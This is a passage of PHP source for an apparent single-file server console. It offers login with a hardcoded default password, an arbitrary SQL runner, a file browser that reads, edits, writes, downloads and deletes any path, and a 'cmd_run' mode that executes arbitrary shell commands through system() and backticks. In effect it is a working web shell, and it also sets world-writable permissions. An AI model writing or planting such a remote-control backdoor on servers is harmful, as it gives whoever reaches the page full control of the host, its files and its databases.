6nKh9ZMCgBgHJU8y1SYVKgmLWWe1dyV+Fxrn45wSCwaKYKBcjkJCBeOaPRyrFozBKdR+whkOwUEhTAZfIlniZn7KDgy7IcZfZ2Qr3dhBAAh+QQFAAAPACwBAAEAFgAWAAAEbvDJSYGiOONyNTaZlS2fSHHYwZCUYkrvo7JY8Crdw6zeY+eTWU8S8NCGyKTywWkWegzHwRE9GAJXbG/R6HqXYM2xB5QsBggkQdGQCNq6gYNMgPsEE4Rcs7bfKQx7FAh1NXiDhxR+RIlhf45EaT0RACH5BAUAAA8ALAEAAQAWABYAAARW8MlJX6k4S3A1DV6lVGA3cRUAGJmZqSxGWCcFe7O7reEzZ7GecDi86DKHx2GZGDwCTidxSq1OfhhHr4ClJEPdh1SS/Fa4lTElMVRLGG5NfDpgW8VaTwQAOw==";
    $sys_file[6][0]="icon_tool.gif";
    $sys_file[6][1]="R0lGODlhDwARAMQbAAAAAIQAAISGhJwwADEwY2NhnP+enP8AAP8wAP/PY////84wAM7//87PzqWmpZzPzv//nJSWlOfn57W2tc7v/2Oezs5hY1JRUjEwnP//zkJBQv///wAAAAAAAAAAAAAAACH5BAEAABsALAAAAAAPABEAAAV44CaOomAKwFgQG1G8giI56VYoq6IwFCE1NBGBQahQHoIJMShkAAACJJTwHEUAmgimkgJcJjXSBlCoCRphkiUQKKHFm0UmsUix2+IABDEABBQGB2kbenx+gQGDAQmGAYiKjH2OB4l5kYeUkI2PeQsDkp59cE81pCMhADs=";
    $sys_file[7][0]="download.png";
    $sys_file[7][1]="iVBORw0KGgoAAAANSUhEUgAAABAAAAAQCAMAAAAoLQ9TAAAABGdBTUEAAK/INwWK6QAAAAFzUkdCAK7OHOkAAAAgY0hSTQAAeiYAAICEAAD6AAAAgOgAAHUwAADqYAAAOpgAABdwnLpRPAAAArVQTFRFAABqAAAuDB2gCR+7I0G1Kkm4K0m4LUu4L0y4MU24M064NVC4N1G4OVK4O1S5MEOqCw9gAAAAAABlAAByAAB5AAB4AAB7AAB8AABkAAAGBRCWKEm7UWjEYG7DXm3DXGzCXGvBXGzBXWzAXWu/QF7CGDqvAQdOEielMm/PBhFbAAAAFy2oCBNaAAAAGS6nCRRZGzCnChRZHTGnHzOnCxVZIjSnMXC8DBdbAB4AJTanNohREUg0ElkUJzenHGgaKjmnElwSLDuoC1ENIi2bVYbch9J8B0YJBQZZHihxJzR1NThtPj5sPT1tPj1uL05SaLNeCDwIAAAAAAAAAAwAElEPLG8gKGUeHFoUFVIPDUQKAhwBZpzow9r07/P76fD85Oz84er85+776vD87PD3mL3nbaLry9/1+/z99Pj/7/T/6vD/6O//6/H/8PX/9Pb6nsHqN3jYbKHrzOH3//7++fv/9Pf/7/P/6O7/8PP6osXwPn/ga6HrzuL3///+/f7/+fr/7vP/6fD/7fD6ocXxPX7gaqHr0OT4///9+/v+9vj+8fT+7PD+6Ov2o8fzPH3gaaDsutn62ej41eX41OT30uP2z+D1zt30ory6eKh+fa3QPX7hZZ7sdLX8b6nub6jua6buaKTwZqL2TI28QqFISb0nQJteZJ7tZqj0p73dz9jkzdbl0Njpj6u1RJ1LXcowZM0zbNVBYp3tY6bzusjflaDUucDhv8zEU6lNatQ6c9k/et9HnfhuguRbTr87YJztXqP1rLrYV2rUjpven7WrSLA9e+VJgedNjO5arf6Ft/+QgeNhXpztWaD4n67Vi5bSpKvUyMfUcpqEU7tFjPRamfppuf+Wyv+shNtvWJXulqPRv77PvLvQvLzSubjPZ5B+WL1LoP5xw/+k3//KS6dGk+lxnOOBpN6RTQCQ5wAAAFt0Uk5TAAAAAAAAAAAAAAAAAAAAAAAAAREZGRkaEQEyt9LR0dHR0dHR07Qwcv2BA3aOBXaNdo12do12/pEWdv3Wn3bQdsV3u2X7/rAah7CwsLCx4PygBxIbl9bNw7mqXxWmEq8AAAAJcEhZcwAAAEgAAABIAEbJaz4AAAEbSURBVBjTARAB7/4AABITFBQVFBQUFBQWFxgZAQACGhscHR4fICEhIiMkJSYDAAQnW1xdXl9gX2FiY2QoKSoABStlZmdoaWprbG1ub3AsLQAGLnFyc3R1dmp3bHh5ei8tAAcwe3x9fn91gIFrgoOEMS0ACDKFhod9c4iJiouMjY4xLQAJM4+QkZKTlJWWl5iZmjQtAAo1m5ydnp+goaKjpKU2NzgACzmmp6ipqqusra6vsDo7PAAMPbGys7S1tre4ubq7vL0+AA0/vr/AwcLDxMXGx8jJykAADkHLzM3Oz9DR0tPU1dbXQgAPQ0TY2drb3N3e3+Dh4kVGABBHSElKS0xMTU7j5OXmT1AAERFRUlJSUlJTVFVWV1hZWqNVbe76jSu/AAAAJXRFWHRkYXRlOmNyZWF0ZQAyMDEzLTAxLTE1VDA5OjUzOjIzKzA4OjAwwpBMJAAAACV0RVh0ZGF0ZTptb2RpZnkAMjAwNC0xMC0wMVQyMDozNzo1OCswODowMCMS5UkAAAAZdEVYdFNvZnR3YXJlAEFkb2JlIEltYWdlUmVhZHlxyWU8AAAAAElFTkSuQmCC";
    for($i=0,$max_i=count($sys_file);$i<$max_i;$i++)
    {
      file_put_contents("{$base_tmp}/{$sys_file[$i][0]}",base64_decode($sys_file[$i][1]));
      chmod("{$base_tmp}/{$sys_file[$i][0]}",0666);      
    }  
  } 
  function check_login($needExit=false)
  {
    global $ini_settings;    
    $check=false;

    if($ini_settings['PASSWORD']=="")
    {
      $check=TRUE;
    }
    else
    {                 
      if($ini_settings['PASSWORD']!=$_SESSION['LOGIN_PASSWORD'])
      {
        $check=FALSE;
      }
      else
      {
        $check=TRUE;
      }
    }
    
    if($needExit==true && $check==false)
    {
      @header("location: ?");
      exit();
    }
    else
    {
      return $check;
    } 
  }  
  array_walk_recursive($_POST, 'sanitizeVariables');
  array_walk_recursive($_GET, 'sanitizeVariables');
  array_walk_recursive($_COOKIE, 'sanitizeVariables');
  array_walk_recursive($_REQUEST, 'sanitizeVariables');

  //default
  //$tmp_path = sys_get_temp_dir();
  $base_dir = dirname(__FILE__);
  $time=time();
  $base_tmp = "{$base_dir}/.tmp";
  $base_db_ini = ".conn.ini";
  
  
  
  $config_templete=
';本系統登入密碼
PASSWORD="3wa awesome"
;資料庫設定
DB_HOST="localhost"
DB_LOGIN="root"
DB_PASSWORD=""
DB_NAME=""
;mysql mssql pgsql oracle
DB_KIND="mysql"
';  

  if(!is_dir($base_tmp))
  {  
    @mkdir($base_tmp,0777);    
  }
  create_files();
  if(!is_file($base_db_ini))
  {
    @touch($base_db_ini);
    file_put_contents($base_db_ini,$config_templete);
  }
  $ini_settings = parse_ini_file($base_db_ini);
  check_login(false);
  //load DB
  $pdo = null;
  try{
    $pdo = new PDO("{$ini_settings['DB_KIND']}:dbname={$ini_settings['DB_NAME']};host={$ini_settings['DB_HOST']}",$ini_settings['DB_LOGIN'],$ini_settings['DB_PASSWORD']);
    switch(strtoupper($ini_settings['DB_KIND']))
    {
      case 'MSSQL':
        break;
      case 'ORACLE':
        break;
      case 'PGSQL':
        break;
      case 'MYSQL':
        $pdo->query("SET NAMES UTF8");
        $pdo->query("SET time_zone = \'+8:00\'");
        $pdo->query("SET CHARACTER_SET_CLIENT=utf8");
        $pdo->query("SET CHARACTER_SET_RESULTS=utf8");
        $pdo->query("SET GLOBAL group_concat_max_len=102400");
        $pdo->query("SET GLOBAL max_connections=1024");
      break;
    }
  }catch(Exception $e)
  {
    $pdo = null;
    //print_r($e);
    //exit();
  }

   
  //Start  
  $GETS_STRING="mode,page";
  $GETS=getGET_POST($GETS_STRING,'GET');
  $GETS['page']=($GETS['page']=="")?1:(int)$GETS['page'];
  $pre_page =$GETS['page']-1;    //上一頁
  $next_page=$GETS['page']+1;    //下一頁
  
  switch($GETS['mode'])
  {
    case 'getDBTpl':
        $POSTS_STRING="DB_KIND";
        $POSTS=getGET_POST($POSTS_STRING,'POST');
        $m_output = null;
        switch(strtoupper($POSTS['DB_KIND']))
        {
          case 'MSSQL':
              $m_output = 
                   ARRAY(
                      ARRAY('查資料庫'=>'SELECT * FROM [sys].[databases]'),
                      ARRAY('資料表列表'=>'SELECT * FROM [sys].[tables]')
                   ); 
            break;
          case 'MYSQL':
              $m_output = 
                   ARRAY(
                      ARRAY('查資料庫'=>'SHOW DATABASES'),
                      ARRAY('資料表列表'=>'SHOW TABLES')
                   );                            
            break;
          case 'ORACLE':
              $m_output = 
                   ARRAY(
                      ARRAY('查資料庫'=>'SELECT * FROM v$dbfile'),
                      ARRAY('資料表列表'=>'SELECT * FROM v$tablespace')
                   ); 
            break;
          case 'PGSQL':
              $m_output = 
                   ARRAY(
                      ARRAY('查資料庫'=>'SELECT datname FROM pg_database'),
                      ARRAY('資料表列表'=>str_replace("\r","",'
                                SELECT table_schema as "Comment",
                                  table_name AS "Name"
                            		FROM 
                                  information_schema.tables
                            		WHERE
                            			1=1
                            			AND table_schema = \'public\'
                            		ORDER BY 
                                  table_schema,table_name'))
                   ); 
            break;
        }
        echo json_encode($m_output);
        exit();
      break;
    case 'login':        
        $POSTS_STRING="password";
        $POSTS=getGET_POST($POSTS_STRING,'POST');
        $_SESSION['LOGIN_PASSWORD']=stripcslashes(html_entity_decode($POSTS['password']));
        exit();
      break;
    case 'sql_data':
      check_login(true);
      $POSTS_STRING="sql,domid,is_need_page";
      $POSTS=getGET_POST($POSTS_STRING,'POST');
      $SQL=trim(stripcslashes(html_entity_decode($POSTS['sql'])));
      if(is_string_like(strtoupper($SQL),"%;"))
      {
        $SQL=mb_substr($SQL,0,-1);
      }      
      if(strpos($SQL,";")!==false)
      {
        $mSQL=explode(";",$SQL);
        for($i=0,$max_i=count($mSQL)-1;$i<$max_i;$i++)
        {
          selectSQL($mSQL[$i]);
        }
        $SQL=$mSQL[count($mSQL)-1];
      }      
      if(
        is_string_like(strtoupper($SQL),"SELECT %") ||
        is_string_like(strtoupper($SQL),"SHOW %")
        )
      {
        if($POSTS['is_need_page']=='1')
        {
        
          switch(strtoupper($ini_settings['DB_KIND']))
          {
            case "MYSQL":
            case "MSSQL":
            case "ORACLE":                      
                $ra_totals=selectSQL("SELECT COUNT(*) AS `COUNTER` FROM ({$SQL}) AS `A`");
              break;          
            case "PGSQL":
                $ra_totals=selectSQL("SELECT COUNT(*) AS \"COUNTER\" FROM ({$SQL}) AS \"A\"");
              break;
          }        
          
          $totals_page=(int)ceil($ra_totals[0]['COUNTER']/$pagesize);
          $page_url=''; 
          
          switch(strtoupper($ini_settings['DB_KIND']))
          {
            case "MYSQL":
            case "MSSQL":
            case "ORACLE":     
                $ra=selectSQL(sprintf("SELECT * FROM (%s) AS A LIMIT %d,%d;",
                                    $SQL,
                                    ($GETS['page']-1)*$pagesize,
                                    $pagesize));
                break;
            case "PGSQL":
                $ra=selectSQL(sprintf("SELECT * FROM (%s) AS A LIMIT %d OFFSET %d;",
                                    $SQL,
                                    $pagesize,
                                    ($GETS['page']-1)*$pagesize
                                    ));
                break;
          } 
        }
        else
        {
          $ra=selectSQL($SQL);
        }       
      }
      else
      {
        $ra=selectSQL($SQL);
      }
      if(count($ra)==0)
      {
        echo "無查詢資料...";
      }
      else
      {
        ?>
        <table border="1" cellpadding="2" cellspacing="0">
          <?php
          for($i=0,$max_i=count($ra);$i<$max_i;$i++)
          {
            if($i==0)
            {
            ?>
            <tr>
              <?php
              foreach($ra[$i] as $k=>$v)
              {
                ?>
                <th><?php echo $k;?></th>
                <?php
              }
              ?>
            </tr>
            <?php
            }
            ?>
            <tr>
              <?php
              foreach($ra[$i] as $k=>$v)
              {
                ?>
                <td><?php echo $v;?></td>
                <?php
              }
              ?>
            </tr>
            <?php
          }
          ?>
        </table>
        <br>
        <br>
        <?php
        if(is_string_like(strtoupper($SQL),"SELECT %"))
        {        
          if ($GETS['page'] == 1) {     
            $pageurl.='首頁 | 上一頁 | ';
          } else {
            $pageurl.="
            <a style='color:white;' class='page_a' href='javascript:;' value=\"1\">首頁</a>
             | 
            <a style='color:white;' class='page_a' href='javascript:;' value=\"{$pre_page}\">上一頁</a>
             | ";
          }
          if ($GETS['page']==$totals_page || $totals_page==0) {  //如果$GETS['page']==$pagenum　当前页 等于 总页数说明到了最后一页，　或　$pagenum==0　总条数等于０，就不显示连接
            $pageurl.='下一頁 | 最後頁';
          } else {
            $pageurl.="
            <a style='color:white;' class='page_a' href='javascript:;' value=\"{$next_page}\">下一頁</a>
             | 
            <a style='color:white;' class='page_a' href='javascript:;' value=\"{$totals_page}\">最後頁</a>";
          }
          $pageurl.=" | <select class='page_select'>";
          for($i=1;$i<=$totals_page;$i++)
          {
            $pageurl.="<option value='{$i}'>第 {$i} 頁</option>";
          }      
          $pageurl.="</select>";
          ?>
          <script language="javascript">
            $(document).ready(function(){
              $(".page_a").click(function(){
                var page=$(this).attr('value');
                dialogOn("SQL執行中...",function(){                  
                  myAjax_async("?mode=sql_data&page="+page,
                                    "sql="+encodeURIComponent($("#sql_textarea").val())+
                                    "&domid=<?php echo $POSTS['domid'];?>"+
                                    "&is_need_page="+(($("#is_need_page").prop('checked')==true)?'1':'0')
                                    ,"#<?php echo $POSTS['domid'];?>"
                                    ,function(){
                                      dialogOff();
                                    }                                    
                        );
                });
              });
              $(".page_select").change(function(){
                var page=$(this).val();
                dialogOn("SQL執行中...",function(){                  
                  myAjax_async("?mode=sql_data&page="+page,
                                    "sql="+encodeURIComponent($("#sql_textarea").val())+
                                    "&domid=<?php echo $POSTS['domid'];?>"+
                                    "&is_need_page="+(($("#is_need_page").prop('checked')==true)?'1':'0')
                                    ,"#<?php echo $POSTS['domid'];?>"
                                    ,function(){
                                      dialogOff();
                                    }                                    
                        );
                });
              });
              //setting
              $(".page_select").val("<?php echo $GETS['page'];?>");
                            
            });
          </script>
          <?php
          echo $pageurl; 
        }       
      }      
      exit();
      break;
    case 'checkSQLSetting':
        check_login(true);
        if($pdo==null)
        {
          echo "false";
        }
        else
        {
          echo "true";
        }
        exit();
      break;
    case 'loadSQLini':
        check_login(true);
        echo file_get_contents($base_db_ini);
        exit();
      break;
    case 'logout':
        unset($_SESSION['LOGIN_PASSWORD']);
        exit();
      break;
    case 'unload':            
        deltree($base_tmp);               
        exit();
      break;
    case 'sql_run':
        check_login(true);
        $POSTS_STRING="sql_textarea";
        $POSTS=getGET_POST($POSTS_STRING,'POST');
        $SQL=stripcslashes(html_entity_decode($POSTS['sql_textarea']));
        $ra=selectSQL($SQL);
        if(count($ra)==0)
        {
          echo "無查詢資料...";
        }
        else
        {
          ?>
          <table border="1" cellpadding="2" cellspacing="0">
            <?php
            for($i=0,$max_i=count($ra);$i<$max_i;$i++)
            {
              if($i==0)
              {
              ?>
              <tr>
                <?php
                foreach($ra[$i] as $k=>$v)
                {
                  ?>
                  <th><?php echo $k;?></th>
                  <?php
                }
                ?>
              </tr>
              <?php
              }
              ?>
              <tr>
                <?php
                foreach($ra[$i] as $k=>$v)
                {
                  ?>
                  <td><?php echo $v;?></td>
                  <?php
                }
                ?>
              </tr>
              <?php
            }
            ?>
          </table>
          <?php
        }
        exit();
      break;
    case 'saveFile':
        check_login(true);
        $POSTS_STRING="file_title_text,file_contents_textarea";
        $POSTS=getGET_POST($POSTS_STRING,'POST');
        $POSTS['file_title_text']=stripcslashes(html_entity_decode($POSTS['file_title_text']));                                            
        if (stristr(PHP_OS, 'win')) {                
          if(mb_strripos($POSTS['file_title_text'],":")!==false)
          {
            $POSTS['file_title_text']=mb_substr($POSTS['file_title_text'],mb_strripos($POSTS['file_title_text'],":")-1,mb_strlen($POSTS['file_title_text']));            
          }
          $POSTS['file_title_text']=addslashes(mb_convert_encoding($POSTS['file_title_text'],'BIG5','UTF-8'));
        } 
        file_put_contents(
          $POSTS['file_title_text'],
          stripcslashes(html_entity_decode($POSTS['file_contents_textarea']))          
        );
        exit();
      break;
    case 'downloadFile':
        check_login(true);        
        $POSTS_STRING="filename";
        $POSTS=getGET_POST($POSTS_STRING,'POST');               
        $POSTS['filename']=stripcslashes(html_entity_decode($POSTS['filename']));
        $orin_name=$POSTS['filename'];                                                
        if (stristr(PHP_OS, 'win')) {                
          if(mb_strripos($POSTS['filename'],":")!==false)
          {
            $POSTS['filename']=mb_substr($POSTS['filename'],mb_strripos($POSTS['filename'],":")-1,mb_strlen($POSTS['filename']));            
          }          
          $POSTS['filename']=addslashes(mb_convert_encoding($POSTS['filename'],'BIG5','UTF-8'));
        }                              
        //不能用內鍵的basename...
        $fsize=ffsize($POSTS['filename']);
        $m_basename=explode(DIRECTORY_SEPARATOR,$orin_name);
        $bs=end($m_basename);                                
        if(1)
        {
          apache_setenv('no-gzip', 1); 
          header('Content-Type: application/octet-stream');
          header("Content-Disposition: attachment; filename=\"{$bs}\""); 
          header('Content-Transfer-Encoding: binary');
          header('Expires: 0');
          header('Cache-Control: must-revalidate');
          header('Pragma: public');
          header('Content-Length: '.$fsize);  
          if (in_array('mod_xsendfile', apache_get_modules())) {
            header("X-Sendfile: {$POSTS['filename']}");
            header("X-LIGHTTPD-send-file: {$POSTS['filename']}");
            header("X-Accel-Redirect : {$POSTS['filename']}");
          } else {
            readfile($POSTS['filename']);
          }
          
        }          
        exit();
      break;
    case 'getMemoryTotal':
        echo getMEM_Status();
        exit();
      break;
    case 'getMemoryUsage':
        echo getMEM_Usage();
        exit();
      break;      
    case 'delFile':
        check_login(true);
        $POSTS_STRING="filename";
        $POSTS=getGET_POST($POSTS_STRING,'POST');
        $POSTS['filename']=stripcslashes(html_entity_decode($POSTS['filename']));                                            
        if (stristr(PHP_OS, 'win')) {                
          if(mb_strripos($POSTS['filename'],":")!==false)
          {
            $POSTS['filename']=mb_substr($POSTS['filename'],mb_strripos($POSTS['filename'],":")-1,mb_strlen($POSTS['filename']));            
          }
          $POSTS['filename']=addslashes(mb_convert_encoding($POSTS['filename'],'BIG5','UTF-8'));
        }                   
        unlink($POSTS['filename']);          
        exit();
      break;
    case 'realPath':
        check_login(true);
        $POSTS_STRING="filename";
        $POSTS=getGET_POST($POSTS_STRING,'POST');
        //echo realpath(stripcslashes(html_entity_decode($POSTS['filename'])));
        $POSTS['filename']=stripcslashes(html_entity_decode($POSTS['filename']));                                            
        if (stristr(PHP_OS, 'win')) {                
          if(mb_strripos($POSTS['filename'],":")!==false)
          {
            $POSTS['filename']=mb_substr($POSTS['filename'],mb_strripos($POSTS['filename'],":")-1,mb_strlen($POSTS['filename']));            
          }
          $POSTS['filename']=mb_convert_encoding($POSTS['filename'],'BIG5','UTF-8');          
        }  
        if ( substr(PHP_OS,0,3) == 'WIN')
        {
          echo mb_convert_encoding($POSTS['filename'],'UTF-8','BIG5');
        }
        else
        {
          echo realpath($POSTS['filename']);
        }      
        exit();
      break;
    case 'getImageBase64':
        check_login(true);
        $POSTS_STRING="filename";
        $POSTS=getGET_POST($POSTS_STRING,'POST');
        $POSTS['filename']=stripcslashes(html_entity_decode($POSTS['filename']));                                            
        if (stristr(PHP_OS, 'win')) {                
          if(mb_strripos($POSTS['filename'],":")!==false)
          {
            $POSTS['filename']=mb_substr($POSTS['filename'],mb_strripos($POSTS['filename'],":")-1,mb_strlen($POSTS['filename']));            
          }
          $POSTS['filename']=addslashes(mb_convert_encoding($POSTS['filename'],'BIG5','UTF-8'));
        }
        if (extension_loaded('gd') && function_exists('gd_info')) {
          //有GD
          //取得尺寸
          list($cur_width,$cur_height)=getimagesize($POSTS['filename']);
           
          //計算新尺吋(小),比差為s_code
          $smallsize_width=300;
          if($cur_width<=$smallsize_width)
          {
            $new_s_width=$cur_width;
            $new_s_height=$cur_height;
          }
          else
          {
            if($smallsize_width!=''){
              $s_code=$cur_width/$smallsize_width;
              $new_s_width=$smallsize_width;
              $new_s_height=$cur_height/$s_code;
            }
            else
            {
              $new_s_width=$cur_width;
              $new_s_height=$cur_height;
            }
          }
          $new_s_width=(int)($new_s_width);
          $new_s_height=(int)($new_s_height);
          $data=file_get_contents($POSTS['filename']);
          $src=imagecreatefromstring($data) or die("error!\n");
          //small的影像來源
          //$src=$function_name($file_name) or die("error!\n");      
          //small的建立新影像大小
          $dst=imagecreatetruecolor($new_s_width,$new_s_height) or die("error!\n");       
          //複製影像並調整尺寸     
          imagecopyresized($dst,$src,0,0,0,0,
                          $new_s_width,$new_s_height,
                          $cur_width,$cur_height) or die("error!\n");          
          //畫質雖好，但太慢
          /*imagecopyresampled($dst,$src,0,0,0,0,
                          $new_s_width,$new_s_height,
                          $cur_width,$cur_height) or die("error!\n");*/
          ob_start();                                                  
          imagejpeg($dst, null, 80);//壓縮比//理想是用jpeg
          $data=ob_get_contents();
          ob_end_clean();
          imagedestroy($src);
          imagedestroy($dst);
          echo base64_encode($data);         
        }
        else
        {
          echo base64_encode(file_get_contents($POSTS['filename'])); 
        }
        exit();
      break;
    case 'editFile':
        check_login(true);
        $POSTS_STRING="filename";
        $POSTS=getGET_POST($POSTS_STRING,'POST');
        $POSTS['filename']=stripcslashes(html_entity_decode($POSTS['filename']));                                            
        if (stristr(PHP_OS, 'win')) {                
          if(mb_strripos($POSTS['filename'],":")!==false)
          {
            $POSTS['filename']=mb_substr($POSTS['filename'],mb_strripos($POSTS['filename'],":")-1,mb_strlen($POSTS['filename']));            
          }
          $POSTS['filename']=addslashes(mb_convert_encoding($POSTS['filename'],'BIG5','UTF-8'));
        }        
        if(checkIsUTF8File($POSTS['filename']))
        {                                
          echo file_get_contents($POSTS['filename']);
        }
        else
        {
          echo mb_convert_encoding(file_get_contents($POSTS['filename']),'UTF-8','BIG5');
        }
        exit();
      break;
    case 'IsWriteFile':
        check_login(true);
        $POSTS_STRING="filename";
        $POSTS=getGET_POST($POSTS_STRING,'POST');
        $POSTS['filename']=stripcslashes(html_entity_decode($POSTS['filename']));                                            
        if (stristr(PHP_OS, 'win')) {                
          if(mb_strripos($POSTS['filename'],":")!==false)
          {
            $POSTS['filename']=mb_substr($POSTS['filename'],mb_strripos($POSTS['filename'],":")-1,mb_strlen($POSTS['filename']));            
          }
          $POSTS['filename']=mb_convert_encoding($POSTS['filename'],'BIG5','UTF-8');
        }
        if(is_writable($POSTS['filename']))
        {
          echo "true";
        }
        else
        {
          echo "false";
        }
        exit();
      break;
    case 'cmd_run':
        check_login(true);
        $POSTS_STRING="cmd";
        $POSTS=getGET_POST($POSTS_STRING,'POST');
        $POSTS['cmd']=stripcslashes(html_entity_decode($POSTS['cmd']));
        if ( substr(PHP_OS,0,3) == 'WIN')
        {      
          ob_start();    
          system("{$POSTS['cmd']} 2>&1");
          $data=ob_get_contents();
          ob_end_clean();          
          echo htmlspecialchars(mb_convert_encoding($data,'UTF-8','BIG5'));
        }
        else
        {
          echo htmlspecialchars(`{$POSTS['cmd']} 2>&1`);
        }
        exit();
      break;
    case 'getDirs':
        check_login(true);
        $POSTS_STRING="path";
        $POSTS=getGET_POST($POSTS_STRING,'POST');         
        $mDatas=ARRAY();
        $mWinDisk=ARRAY();  
        $POSTS['path']=stripcslashes(html_entity_decode($POSTS['path']));
        if (stristr(PHP_OS, 'win')) {                
          if(mb_strripos($POSTS['path'],":")!==false)
          {
            $POSTS['path']=mb_substr($POSTS['path'],mb_strripos($POSTS['path'],":")-1,mb_strlen($POSTS['path']));            
          }
          $POSTS['path']=mb_convert_encoding($POSTS['path'],'BIG5','UTF-8');
        }                            
        $dirfiles=glob($POSTS['path'].DIRECTORY_SEPARATOR."{,.}*",GLOB_BRACE); 
        if (stristr(PHP_OS, 'win')) {
          $az="ABCDEFGHIJKLMNOPQRSTUVWXYZ";
          $m=ARRAY();
          for($i=0,$max_i=strlen($az);$i<$max_i;$i++)
          {
            if(is_dir("{$az[$i]}:"))
            {
              if(is_readable("{$az[$i]}:"))
              {
                $m=ARRAY();
                $m['filename']="{$az[$i]}:";
                $m['isdir']='1';
                array_push($mWinDisk,$m);
              }
            }
          }
        }               
        for($i=0,$max_i=count($dirfiles);$i<$max_i;$i++)
        {
          $m=ARRAY();
          $m['filename']=$dirfiles[$i];
          $m['isdir']=is_dir($dirfiles[$i])?'1':'0';
          array_push($mDatas,$m);          
        }
        $mSortedDatas = ARRAY();
        $mDirs=array_orderby($mDatas,'isdir',SORT_DESC,'filename',SORT_ASC);
        $mSortedDatas=array_merge($mWinDisk,$mDirs);
        ?>
        <table border="0" width="100%" cellpadding="0" cellspacing="0">
          <?php
            for($i=0,$max_i=count($mSortedDatas);$i<$max_i;$i++)
            {
              //echo realpath($mSortedDatas[$i]['filename'])."<br>";
              $realpath=realpath($mSortedDatas[$i]['filename']);              
              //$realpath=$mSortedDatas[$i]['filename'];              
              if ( substr(PHP_OS,0,3) == 'WIN')
              {          
                $b_realpath=str_replace("\\\\","\\",$mSortedDatas[$i]['filename']);                        
                $b_realpath=mb_convert_encoding($b_realpath,'UTF-8','BIG5');                                
              }
              else
              {
                $b_realpath=$mSortedDatas[$i]['filename'];
              }
              $m_basename=explode(DIRECTORY_SEPARATOR,$b_realpath);
              $basename=end($m_basename);
              //不能用內鍵的，幹 
              //$basename=basename($realpath);  
                                         
              $dirfile_img=($mSortedDatas[$i]['isdir']=='1')?'folder.png':'file.png';
              //echo $mSortedDatas[$i]['filename']."<br>";
              ?>
              <tr>
                <td width="15">
                  <img src="<?php echo ".tmp/{$dirfile_img}";?>"></td>
                <td>
                  <!--檔名列表-->
                  <a href="javascript:;"
                    <?php
                      if($mSortedDatas[$i]['isdir']=='1')
                      {
                        ?>
                        style="color:cyan;"
                        name="dirpath_click"
                        <?php
                      }
                      else
                      {
                        ?>
                        style="color:while;"
                        name="file_edit_filename"
                        <?php
                      }
                    ?>
                  ><?php echo $basename;?></a></td>
                <td width="15">
                  <?php
                    if($mSortedDatas[$i]['isdir']=='0')
                      {
                        ?>
                        <a href="javascript:;" name="detail_a">
                          <img src=".tmp/detail.gif">
                          <span style="display:none;"><?php echo basename($mSortedDatas[$i]['filename']);?></span>
                        </a>
                        <?php
                      }
                  ?>
                </td>
                <td width="15">
                  <?php
                    if($mSortedDatas[$i]['isdir']=='0')
                      {
                        ?>
                        <a href="javascript:;" name="download_a">
                          <img src=".tmp/download.png">
                          <span style="display:none;"><?php echo $b_realpath; ?></span>
                        </a>
                        <?php
                      }
                  ?>
                </td>                                 
                <td width="15">
	  <?php
	    //刪除
	    if($mSortedDatas[$i]['isdir']=='0')
	      {
		?>
		<a href="javascript:;" name="del_a">
		  <img src=".tmp/del.gif">
		  <span style="display:none;"><?php echo $b_realpath; ?></span>
                        </a>
                        <?php
                      }
                  ?>
                </td>              
              </tr>
              <?php
            }
          ?>
        </table>
        <script language="javascript">
          function basename(filepath)
          {
            $m=explode("/",filepath);
            return end($m);
          }
          function subname(filepath)
          {
            $m=explode(".",filepath);
            return end($m);
          }
          function getext($s){	return strtolower(subname($s));}
          function isvideo($file){	if(in_array(getext($file),new Array('mpg','mpeg','avi','rm','rmvb','mov','wmv','mod','asf','m1v','mp2','mpe','mpa','flv','3pg','vob'))){		return true;	}	return false;} 
          function isdocument($file){	if(in_array(getext($file),new Array('docx','odt','odp','ods','odc','csv','doc','txt','pdf','ppt','pps','xls'))){		return true;	}	return false;} 
          function isimage($file){	if(in_array(getext($file),new Array('jpg','bmp','gif','png','jpeg','tiff','tif','psd'))){		return true;	}	return false;} 
          function isspecimage($file){	if(in_array(getext($file),new Array('tiff','tif','psd'))){		return true;	}	return false;}
          function isweb($file){	if(in_array(getext($file),new Array('htm','html'))){		return true;	}	return false;} 
          function iscode($file){	if(in_array(getext($file),new Array('c','cpp','h','pl','py','php','phps','asp','aspx','css','jsp','sh','shar'))){		return true;	}	return false;}
          
          function loadSQLini()
          {
            //載入 SQL INI 資料
            var tmp=myAjax("?mode=loadSQLini","");
            $("#config_setting_textarea").val(tmp);
          } 
          function downloadFile(filename)
          {                                    
            var time_id=time();            
            if($("#myform_"+time_id).size()==0)
            { 
              var tmp="";
              tmp+="<form style='display:none;' id='myform_"+time_id+"' action='?mode=downloadFile' method='post' target='_top' >";
              tmp+="<input type='text' id='filename_"+time_id+"' name='filename'>";
              tmp+="</form>";
              $("body").append(tmp);
            }
            $("#filename_"+time_id).val(filename);            
            $("#myform_"+time_id).submit();                                   
          }
            
        	function preg_replace (array_pattern, array_pattern_replace, my_string)  {
        	  var new_string = String (my_string);
            
        		for (var i=0; i<array_pattern.length; i++) {
        			var reg_exp= RegExp(array_pattern[i], "gi");
        			var val_to_replace = array_pattern_replace[i];
        			new_string = new_string.replace (reg_exp, val_to_replace);
              //alert(new_string);
        		}
            alert(new_string);
        		return new_string;
        	}
          function jsAddSlashes($str) {
            $pattern = [
                "/\\\\/"  , "/\n/"    , "/\r/"    , "/\"/"    ,
                "/\'/"    , "/&/"     , "/</"     , "/>/"
            ];
            $replace = [
                "\\\\\\\\", "\\n"     , "\\r"     , "\\\""    ,
                "\\'"     , "\\x26"   , "\\x3C"   , "\\x3E"
            ];            
            return preg_replace($pattern,$replace,$str);
          } 
          $(document).ready(function(){
             $("*[name='dirpath_click']").click(function(){  
               var bn=$(this).text();        
               window['now_url']+=bn+"/";
               window['now_dir']+=bn+"<?php echo jsAddSlashes(DIRECTORY_SEPARATOR);?>";               
               getDirs(window['now_dir']);
             });
             $("*[name='file_edit_filename']").click(function(){
               //檔案名稱
               var file = window['now_dir']+$(this).text();               
               //取得完整路徑
               var realpath_tmp=myAjax("?mode=realPath",
                                "filename="+encodeURIComponent(file));
               $("#file_title_text").val(realpath_tmp);
               //如果是圖片...                                
               //檔案內容                    
               dialogOn("資料讀取中...",function(){                           
                 var tmp=myAjax("?mode=editFile",
                                  "filename="+encodeURIComponent(file));                                  
                 $("#file_contents_textarea").val(tmp);                 
                 if(isimage(file))
                 {                  
                   dialogOn(sprintf("<img style='max-width:300px;' src='data:image/png;base64,"+
                                  myAjax('?mode=getImageBase64',"filename="+encodeURIComponent(file))+"'> \
                                  <br> \
                                  <br> \
                                  <center> \
